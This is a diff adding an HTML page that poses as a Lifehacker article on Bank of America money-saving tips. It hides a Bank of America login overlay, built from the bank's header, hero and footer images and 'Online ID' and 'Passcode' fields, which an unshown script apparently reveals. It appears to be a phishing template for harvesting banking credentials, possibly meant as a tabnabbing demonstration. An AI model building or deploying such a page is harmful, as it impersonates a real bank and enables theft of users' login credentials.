@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang='en'>
+<head>
+  <meta charset='utf-8' />
+  <title>Lifehacker</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+    }
+    .header, .hero, .footer {
+      width: 1040px;
+      display: block;
+    }
+    #username, #password {
+      position: absolute;
+      width: 192px;
+      height: 21px;
+      font-size: 18px;
+      padding: 7.5px 4px;
+      outline: none;
+      font-family: system-ui;
+    }
+    #username {
+      top: 160px;
+      left: 39px;
+    }
+    #password {
+      top: 210px;
+      left: 39px;
+    }
+    ::placeholder {
+      color: #999;
+    }
+    .dn {
+      display: none;
+    }
+    .lh-header {
+      width: 100%;
+    }
+    .lh-sidebar {
+      float: left;
+      width: 40%;
+    }
+    .lh-article {
+      float: right;
+      width: 55%;
+      margin-right: 5%;
+      font-family: system-ui;
+    }
+    .lh-article p {
+      color: #333;
+    }
+    .money {
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class='lifehacker'>
+    <img class='lh-header' src='lh-header.png' />
+    <img class='lh-sidebar' src='lh-sidebar.png' />
+    <div class='lh-article' src='lh-sidebar.png'>
+      <h1>Top 10 Money Saving Tips For Your Bank of America Account</h1>
+      <img class='money' src='money.jpg' />
+      <p>
+        No matter where you are on your financial journey, you need to know that it’s possible for anyone to turn their financial life around. Sometimes all it takes is that first step in the right direction to get things moving in your favor. But, as with most things, sometimes that very first step is the hardest part.
+      </p>
+
+      <p>
+        That’s why we created this list of 10 ways to save with your <a id="boalink" href="https://bankofamerica.com">Bank of America</a> account today. None of these tactics will be life-changing on their own, but they can make quite a difference over time if you’re able to implement more than one. Some of these suggestions take just a few minutes, while others require a bit of regular effort. Still, they’re all incredibly simple – anyone can do them.
+      </p>
+    </div>
+  </div>
+  <div class='boa dn'>
+    <img class='header' src='header.png' />
+    <img class='hero' src='hero.png' />
+    <img class='footer' src='footer.png' />
+    <input id='username' placeholder='Online ID' autofocus autocomplete='off' autocorrect='off' autocapitalize='off' spellcheck='false' />
+    <input id='password' placeholder='Passcode' autocomplete='off' autocorrect='off' autocapitalize='off' spellcheck='false' />
+  </div>
+  <script src="index.js"></script>
+</body>
+</html>
